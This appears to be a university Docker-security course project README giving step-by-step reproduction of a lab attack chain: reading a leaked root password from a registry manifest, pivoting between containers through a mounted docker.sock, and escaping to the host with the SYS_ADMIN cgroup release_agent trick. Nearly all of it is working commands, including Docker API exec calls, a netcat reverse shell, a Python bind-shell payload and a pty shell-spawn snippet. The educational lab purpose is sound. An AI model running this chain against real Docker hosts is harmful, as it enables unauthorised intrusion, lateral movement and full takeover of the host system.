## INSE6130 - Docker Security Project : Steps to Reproduce for Attack 1

* A. Compromising Container C1
* B. Compromising Container C2
* C. Comprimising Underlying Operating System **\[Goal\]**

![Attack1_IPs](https://user-images.githubusercontent.com/30471250/155939425-46f20bd4-b65b-4679-9154-0328453668cc.jpg)

---

#### A. Compromising Container C1:


#### Context:

*A Docker Environment is running in an organization and it has several images and few containers running. It also has a docker registry service running on port 5000 for developers to access the status of images and containers.*

*An attacker (or an adversary) is in the same network as the system on which docker engine is installed (say Ubuntu). S(he) does not have access to the Ubuntu system (its very secure) however S(he) could see that there is a docker environment in the network as docker registry can be accessed on port 5000. The docker registry itself does not pose any serious security risk as it does not allow the user to create, delete or publish images (unless it is writable). The objective of the attacker is to find and exploit the vulnerabilities in the docker environment (if any) and eventually gain access to the underlying Ubuntu operating system.*

#### Steps:

1. Check running ports on the Ubuntu system by scanning its IP address (the IP Address of Ubuntu system is easy to discover assuming that the attacker is in the same network)

	`nmap -Pn 192.168.2.44 -p-` (assume IP is 192.168.2.44)
	
You would see that port 22 and port 5000 is open. 

2. We know that the Docker registry runs on port 5000 by default, we can try checking it in the browser to see if we get any response.

	http://192.168.2.44:5000/v2/_catalog

You would see a JSON response listing down all the available images on the registry. 

3. Each image can have different tags published which can be checked by following URL for each image.

	http://192.168.2.44:5000/v2/image-name/tags/list
	
Docker registry can also be used to read manifest file of the images. Manifest file basically contains all the information about that image since the image is built. These manifest file can unintentionally be exposing some sensitive information, who knows, lets check.

4. Hit following URL to read manifest file of an image (say my-ubuntu:vuln)

	http://192.168.2.44:5000/v2/my-ubuntu/manifests/vuln
	
A Manifest file will be downloaded. On checking you could see that there is a history section in the file which contains history of all the commands which were ran when the image was being built. On careful observation one could see that it is exposing a string named SECRET, whose value is being set as the password of root user in the very next command. In further commands, the root user is being enabled for login on SSH server which is running on port 22. As an attacker, we got the hint that the value of SECRET is the password for root user on SSH. Also port 22 was discovered during initial port scan.

5. Try logging into SSH on 192.168.2.44 (Ubuntu) using root user and you would get into the system as a root user.

	`ssh root@192.168.2.44`
	
However you would see that the system which we have just compromised is not actually Ubuntu system. It is one of the docker container running on that Ubuntu system. Since we got the password from the manifest file of my-ubuntu:vuln image, so we are inside the container of my-ubuntu:vuln. Also it is obvious by looking at the hostname of the system that we are inside some docker container.

So, Container C1 is compromised.

---

#### B. Comprimising Container C2:

#### Background: 

*Container C1 is already compromised which has docker.sock file mounted at /var/run/docker.sock. This can leveraged to communicate with docker engine and get access to other running containers.*

*To communicate with Docker Engine using docker.sock, 'docker' command line tool should be installed however we are assuming that installation for 'docker' command line is blocked due to security reasons. So, we will be using Unix socket to communicate with Docker Engine.*

#### Steps:

1. List all docker images:

	`curl -s --unix-socket /var/run/docker.sock -X GET http://localhost/images/json | jq`

2. List all the running container:

	`curl -s --unix-socket /var/run/docker.sock -X GET http://localhost/containers/json | jq`
	
3. Choose the container id on which the command would be ran. (say 43de4ed6fa5df1e1f06432df00f6070fb8b6213992b84a7ae2646130263cbd4b)


4. Now, create exec instance from running container, basically, create an instance to run the command on the container.

	`curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/containers/43de4ed6fa5df1e1f06432df00f6070fb8b6213992b84a7ae2646130263cbd4b/exec -H "Content-Type: application/json" -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "DetachKeys": "ctrl-p,ctrl-q", "Tty": false, "Cmd": ["date"] }'`
	
	Copy the ExecID and paste in the next command.
	
	`curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/exec/<ExecID>/start -H "Content-Type: application/json" -d '{ "Detach": false, "Tty": false }'`

	
Now we know that we have the ability to run command on another container (C2), we can get the complete shell access of C2 by getting reverse shell, We would need netcat installed on C2 that can send us the reverse shell. We would need netcat on container C1 as well to catch the reverse shell.

5. Installing netcat on C1:

	`apt install -y netcat` (As simple as that)
	
6. Installing netcat on C2, Not that simple; Use the same curl technique to run command remotely:

	`curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/containers/43de4ed6fa5df1e1f06432df00f6070fb8b6213992b84a7ae2646130263cbd4b/exec -H "Content-Type: application/json" -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "DetachKeys": "ctrl-p,ctrl-q", "Tty": false, "Cmd": ["apt","install","-y","netcat"] }'`
	
	Copy the ExecID and paste in the next command.
	
	`curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/exec/<ExecID>/start -H "Content-Type: application/json" -d '{ "Detach": false, "Tty": false }'`


7. You can check if netcat has been installed properly

	`curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/containers/43de4ed6fa5df1e1f06432df00f6070fb8b6213992b84a7ae2646130263cbd4b/exec -H "Content-Type: application/json" -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "DetachKeys": "ctrl-p,ctrl-q", "Tty": false, "Cmd": ["which","nc"] }'`

	Copy the ExecID and paste in the next command.
	
	`curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/exec/<ExecID>/start -H "Content-Type: application/json" -d '{ "Detach": false, "Tty": false }'`

8. Similarly, net-tools can be installed, however not needed, just to check the IP address of C2. But we would need the IP address of C1 (to send the reverse shell).

	`curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/containers/43de4ed6fa5df1e1f06432df00f6070fb8b6213992b84a7ae2646130263cbd4b/exec -H "Content-Type: application/json" -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "DetachKeys": "ctrl-p,ctrl-q", "Tty": false, "Cmd": ["apt","install","-y","net-tools"] }'`

	Copy the ExecID and paste in the next command.
	
	`curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/exec/<ExecID>/start -H "Content-Type: application/json" -d '{ "Detach": false, "Tty": false }'`

9. Check IP address of C1:

	`ifconfig`
	
(Lets assume its 172.17.0.3)

10. Check IP address of C2:

	`curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/containers/43de4ed6fa5df1e1f06432df00f6070fb8b6213992b84a7ae2646130263cbd4b/exec -H "Content-Type: application/json" -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "DetachKeys": "ctrl-p,ctrl-q", "Tty": false, "Cmd": ["ifconfig"] }'`

	Copy the ExecID and paste in the next command.
	
	`curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/exec/<ExecID>/start -H "Content-Type: application/json" -d '{ "Detach": false, "Tty": false }'`

11. Open the shell listener on C1, on which C2 will send the reverse shell.

	`nc -lvp 8080`

12. Now, lets check if we are able to get complete access to C2, Moment of the truth! Run the netcat command from C2 and wait on C1 to recieve the shell.

	`curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/containers/43de4ed6fa5df1e1f06432df00f6070fb8b6213992b84a7ae2646130263cbd4b/exec -H "Content-Type: application/json" -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "DetachKeys": "ctrl-p,ctrl-q", "Tty": false, "Cmd": ["nc","-e","/bin/sh","172.17.0.3", "8080"] }'`

	Copy the ExecID and paste in the next command.
	
	`curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/exec/<ExecID>/start -H "Content-Type: application/json" -d '{ "Detach": false, "Tty": false }'`

-----

#### C. Comprimising Underlying OS:

##### Compromising underlying OS using SYS_ADMIN linux capability.

##### TL;DR

Paste the following commands in container C2 and jump to step 8.

	mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/child
	echo 1 > /tmp/cgrp/child/notify_on_release
	path=\`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
	echo "$path/exploit" > /tmp/cgrp/release_agent
	echo "#!/bin/sh" > /exploit
	echo python3 -c "'import socket; s=socket.socket(); s.bind((\"192.168.2.44\",1337)); s.listen(1);(r,z) = s.accept();exec(r.recv(999))'" >> /exploit
	chmod a+x /exploit
	sh -c "echo \$\$ > /tmp/cgrp/child/cgroup.procs"

#### Background: 

*Sometimes containers need to be run with extra privileges to perform some operations on the host operating system itself. These containers are run with --privileged flag which adds some special capabilities to the running container, however, it is not considered a best practice for the security of the system. Any user (or attacker) having access to the container can easily elevate his/her access to the underlying operating system.*

*As a remediation of the above issue, containers are run with the specific capability (whichever is needed) instead of running it as a privileged container (which possess all the capabilities). These capabilities can be listed with `capsh --print` command.*

*In this attack scenario, Container C2 is also running with the such capability SYS_ADMIN. Basically, SYS_ADMIN capability allows the container to perform system administration operations such as  quotactl, mount, umount, swapon, swapoff, sethostname, and setdomainname. Although, not running a container as a privileged one, decreases the security risk however these specific capabilities can also be exploited by issuing some commands and access to the underlying operating system can be gained.*


#### Terminology:

* **cgroup:** a control group is a linux kernel feature, used in docker environments, to isolate the resources for a group of processes, so that it does not interfere with each other's resources.

* **release_agent:** it is script which is supposed to run when the last process in a cgroups terminates.

* **notify_on_release:** it is a flag to notify the linux kernel to invoke release_agent, when the last process in a cgroup terminates. By default this flag is disabled (0).

* **/etc/mtab:** it is a list of currently mounted filesystems.

* **sh -c "echo \$\$":** this command prints the PID of sh (or any other) process.

#### Objective:

We will try to create a cgroup and a child cgroup and then terminates it processes to invoke release_agent by enabling notify_on_release.


#### Steps:

1. Create a directory and mount RDMA cgroup controller and then create a child cgroup 'child'.

	`mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/child`

2. Enable notify_on_release flag.

	`echo 1 > /tmp/cgrp/child/notify_on_release`
	
3. Since /etc/mtab file contains currently mounted file systems (cgroup is one of them), store the full path of the cgroup (from underlying OS), in a variable called path.

	`` path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab` ``	

4. Save the path appended with a file named 'exploit' (which will contain actual payload) into release_agent, so that it gets executed when invoked.

	`echo "$path/exploit" > /tmp/cgrp/release_agent`
	
5. Now write actual payload, which is a bind shell, into exploit file. We tried writing reverse shell into the payload however it always ended up with a broken pipe on netcat listener, therefore we are using bind shell.

	`echo "#!/bin/sh" > /exploit`
	
	`echo python3 -c "'import socket; s=socket.socket(); s.bind((\"192.168.2.44\",1337)); s.listen(1);(r,z) = s.accept();exec(r.recv(999))'" >> /exploit`
	
	It is a bind shell written in python which will open port 1337 for connections on operating system's IP. **Please note that the port on which the shell is to be bound should be free. By running above command more than once, can leave the connection on specified port in CLOSED_WAIT state and hence above command will not work. Port number can be replaced to avoid this problem.**

6. Make the exploit file executable

	`chmod a+x /exploit`

7. Now we will spawn a dummy process inside child cgroup, which will end immediately and hence release_agent will be triggered inside operating system, and our payload will be executed.

	
	`sh -c "echo \$\$ > /tmp/cgrp/child/cgroup.procs"`
	
8. Now, check the status of port 1337 by scanning the IP of the operating system

	`nmap -Pn 192.168.2.44 -p 1337`
	
You could see the status is open. Now is the time to connect to the bind shell which is waiting for our connection.

9. Use netcat to connect to the port 1337

	`nc 192.168.2.44 1337`
	
10. Once you are connected to the socket, spawn a bash shell using following snippet, then press **ctrl+D** (Don't press enter) to send EOF signal.

	`import pty,os;os.dup2(r.fileno(),0);os.dup2(r.fileno(),1);os.dup2(r.fileno(),2);pty.spawn("/bin/bash");s.close()`

and BOOM! You got access to the operating system.

---

References:

1. https://blog.atucom.net/2017/06/smallest-python-bind-shell.html	[Smallest Python Bind Shell]
2. https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/	[SYS_ADMIN Exploit Breakdown]
3. https://docs.docker.com/engine/api/sdk/examples/	[Communicating with docker.sock using unix sockets]
4. https://docs.docker.com/engine/api/v1.41/#tag/Exec	[Creating and starting an exec instance on already running container using HTTP]
5. https://tryhackme.com/room/dockerrodeo	[Docker Registry, Reverse Engineering docker images]
